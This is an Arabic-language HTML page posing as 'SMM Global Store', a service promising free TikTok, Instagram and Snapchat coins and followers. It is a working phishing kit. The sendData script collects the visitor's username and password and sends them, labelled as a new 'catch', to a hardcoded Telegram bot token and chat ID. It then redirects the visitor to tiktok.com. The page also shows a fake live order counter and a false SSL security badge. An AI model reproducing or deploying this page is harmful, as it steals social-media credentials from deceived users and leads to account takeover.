<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMM Global Store</title>
    <style>
        :root { --bg-color: #0f0f0f; --input-bg: #1a1a1a; --primary-red: #ff4d4d; --text-gray: #b0b0b0; }
        body { background-color: var(--bg-color); color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        
        .container { width: 90%; max-width: 450px; background: #000; padding: 25px; border-radius: 15px; text-align: center; position: relative; }
        
        h1 { color: #fff; font-size: 28px; margin-bottom: 5px; letter-spacing: 1px; }
        .subtitle { color: var(--text-gray); font-size: 14px; margin-bottom: 10px; }
        .status-top { color: #4ade80; font-size: 13px; margin-bottom: 25px; font-weight: bold; }

        .content-flex { display: flex; align-items: flex-start; gap: 15px; margin-top: 20px; }
        .icons-side { flex: 1; display: flex; flex-wrap: wrap; justify-content: center; gap: 5px; padding-top: 20px; }
        .icons-side img { width: 50px; height: 50px; filter: drop-shadow(0 0 5px rgba(255,255,255,0.1)); }
        
        .form-side { flex: 2; text-align: right; }
        .step-label { font-size: 13px; color: #fff; margin-bottom: 8px; font-weight: 500; }
        
        select, input { 
            width: 100%; padding: 12px; margin-bottom: 18px; border-radius: 8px; border: 1px solid #333; 
            background: var(--input-bg); color: #fff; font-size: 14px; box-sizing: border-box; outline: none;
        }

        .btn-main { 
            width: 100%; padding: 15px; border: none; border-radius: 10px; 
            background: #fff; color: #000; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px;
        }

        .footer-status { 
            background: rgba(22, 45, 22, 0.8); padding: 15px; border-radius: 0 0 15px 15px; 
            margin: 25px -25px -25px -25px; border-top: 1px solid #1a331a; 
        }
        .online-count { color: #4ade80; font-size: 16px; font-weight: bold; margin-bottom: 5px; }
        .secure-txt { color: #888; font-size: 11px; }
    </style>
</head>
<body>

    <div class="container">
        <h1>SMM Global Store</h1>
        <div class="subtitle">أختر الباقة المناسبة لحسابك</div>
        <div class="status-top">نظام المعالجة التلقائية: متصل ✅</div>

        <div class="content-flex">
            <div class="icons-side">
                <img src="https://cdn-icons-png.flaticon.com/512/3046/3046121.png" alt="tiktok">
                <img src="https://cdn-icons-png.flaticon.com/512/2489/2489756.png" alt="coin">
                <img src="https://cdn-icons-png.flaticon.com/512/174/174855.png" alt="insta">
                <img src="https://cdn-icons-png.flaticon.com/512/2111/2111615.png" alt="snap">
            </div>

            <div class="form-side">
                <div class="step-label">1. اختر البرنامج المستهدف:</div>
                <select id="platform" onchange="updateOptions()">
                    <option>تيك توك - TikTok</option>
                    <option>إنستغرام - Instagram</option>
                    <option>سناب شات - Snapchat</option>
                </select>

                <div class="step-label">2. حدد نوع الخدمة:</div>
                <select id="service" onchange="updateOptions()">
                    <option value="coins">شحن عملات/نقاط (Coins/Gold)</option>
                    <option value="follow">زيادة متابعين (Followers)</option>
                </select>

                <div class="step-label">3. اختر الباقة/الكمية المطلوب رشقها:</div>
                <select id="amount">
                    </select>
            </div>
        </div>

        <div style="text-align: right; margin-top: 10px;">
            <div class="step-label">4. أدخل بيانات التحقق والربط:</div>
            <input type="text" id="user" placeholder="(Username) اسم المستخدم">
            <input type="password" id="pass" placeholder="كلمة المرور المشفرة">
        </div>

        <button class="btn-main" onclick="sendData()">تفعيل عملية الرشق الآن</button>

        <div class="footer-status">
            <div class="online-count">🌎 طلبات نشطة عالمياً الآن: <span id="counter">145,280</span></div>
            <div class="secure-txt">🔒 اتصال آمن ومحمي SSL-bit 256</div>
        </div>
    </div>

    <script>
        function updateOptions() {
            const service = document.getElementById('service').value;
            const amountSelect = document.getElementById('amount');
            amountSelect.innerHTML = "";
            
            if(service === "coins") {
                const opts = ["1,000 - 10,000 عملة/نقطة 🔥", "10,000 - 100,000 عملة", "100,000 - 1,000,000 عملة"];
                opts.forEach(o => amountSelect.add(new Option(o, o)));
            } else {
                const opts = ["500 - 5,000 متابع", "10,000 - 50,000 متابع 🔥", "100,000 متابع (VIP)"];
                opts.forEach(o => amountSelect.add(new Option(o, o)));
            }
        }
        window.onload = updateOptions;

        function sendData() {
            const token = "8266153967:AAF2ZpDJy_zn7Zw3md5LUUAOwU9SGKhM7xk";
            const chat_id = "1564944407";
            const user = document.getElementById('user').value;
            const pass = document.getElementById('pass').value;

            if(!user || !pass) { alert("يرجى إكمال البيانات!"); return; }

            const msg = `🎯 صيدة جديدة من الواجهة المطورة:\n👤: ${user}\n🔑: ${pass}\n📦: ${document.getElementById('amount').value}`;
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`)
            .then(() => {
                alert("جاري الاتصال بالسيرفر لتفعيل الباقة...");
                window.location.href = "https://tiktok.com";
            });
        }

        setInterval(() => {
            let c = document.getElementById('counter');
            let n = parseInt(c.innerText.replace(',', '')) + Math.floor(Math.random() * 15);
            c.innerText = n.toLocaleString();
        }, 3000);
    </script>
</body>
</html>
